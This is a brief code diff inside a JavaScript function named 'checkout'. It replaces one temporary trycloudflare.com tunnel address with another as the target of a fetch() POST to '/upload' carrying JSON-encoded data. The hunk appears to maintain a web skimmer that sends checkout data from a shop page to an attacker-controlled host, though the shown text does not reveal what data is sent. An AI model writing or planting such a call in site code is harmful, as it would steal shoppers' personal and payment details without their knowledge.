@@ -242,7 +242,7 @@ const checkout = () => {
             };
         });
 
-        fetch('https://mo-considerations-sheets-bolivia.trycloudflare.com/upload', {
+        fetch('https://improved-growing-blind-bc.trycloudflare.com/upload', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
